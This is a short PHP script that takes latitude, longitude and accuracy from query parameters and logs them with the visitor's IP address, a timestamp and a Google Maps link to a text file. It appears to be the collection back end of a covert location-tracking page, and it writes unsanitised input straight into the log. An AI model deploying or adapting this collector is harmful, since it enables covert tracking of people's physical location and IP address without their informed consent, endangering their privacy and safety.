<?php
if (isset($_GET['lat']) && isset($_GET['lon'])) {
    $lat = $_GET['lat'];
    $lon = $_GET['lon'];
    $acc = isset($_GET['acc']) ? $_GET['acc'] : 'N/A';
    $ip = $_SERVER['REMOTE_ADDR'];
    $timestamp = date("Y-m-d H:i:s");

    $link = "https://www.google.com/maps?q=$lat,$lon";
    $log = "$timestamp | IP: $ip | LAT: $lat | LON: $lon | ACC: $acc | LINK: $link\n";

    file_put_contents("log.txt", $log, FILE_APPEND);
}
?>
